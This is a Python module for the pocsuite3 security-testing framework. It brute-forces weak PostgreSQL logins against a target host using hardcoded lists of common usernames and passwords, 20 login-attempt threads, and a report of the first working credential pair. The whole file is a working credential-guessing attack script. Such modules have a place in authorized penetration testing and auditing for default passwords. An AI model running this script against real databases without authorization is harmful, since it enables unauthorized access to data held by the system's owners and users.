# -*- coding: utf-8 -*-
# author: seven
from pocsuite3.api import register_poc, POCBase, Output,logger,POC_CATEGORY
from pocsuite3.lib.core.threads import run_threads
import psycopg2
import queue
import itertools
import socket

postgres_username = ['postgresql','admin','root','postgres']
postgres_password = ['123456','12345','12345678','root','admin','admin888','admin123','admin@123','postgresql@123','postgres@123','postgres']

class PostgresqlPOC(POCBase):
    vulID = ''
    version = '1.0'
    author = ['seven']
    vulDate = 'Aug 5, 2020'
    createDate = 'Aug 5, 2020'
    name = 'postgresql weakpass'
    appName = 'postgresql'
    appVersion = 'v1.0.0'
    vulType = '弱口令'
    protocol = 'postgresql'

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
    def _verify(self):
        host = self.getg_option("rhost")
        port = self.getg_option("rport") or 5432

        result = {}
        postgresql_burst(host,port)

        if not result_queue.empty():
            username, password = result_queue.get()
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
            result['VerifyInfo']['Username'] = username
            result['VerifyInfo']['Password'] = password
            result['extra'] = username+':'+password        
        
        return self.parse_output(result)
    def _attack(self):
        return self._verify()

task_queue = queue.Queue()
result_queue = queue.Queue()

def get_word_list():
    return itertools.product(postgres_username,postgres_password)

def port_check(host,port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connect = s.connect_ex((host, int(port)))
    if connect == 0:
        return True
    else:
        s.close()
    return False

def postgres_login(host,port,username,password):
    conn = None
    try:
        conn = psycopg2.connect(host=host, port=int(port), user=username, password=password, database='postgres', sslmode='disable', connect_timeout=10)
        return True
    except:
        pass
    finally:
        if conn:
            conn.close()
    return False

def task_init(host,port):
    for username,password in get_word_list():
        task_queue.put((host,port,username.strip(),password.strip()))

def task_thread():
    while not task_queue.empty():
        host,port,username,password = task_queue.get()
        logger.info('try burst {}:{} use username:{} password:{}'.format(
            host, port, username, password))
        if postgres_login(host,port,username,password):
            with task_queue.mutex:
                task_queue.queue.clear()
            result_queue.put((username, password))

def postgresql_burst(host,port):
    if not port_check(host,port):
        return
    try:
        task_init(host,port)
        run_threads(20,task_thread)
    except Exception:
        pass

register_poc(PostgresqlPOC)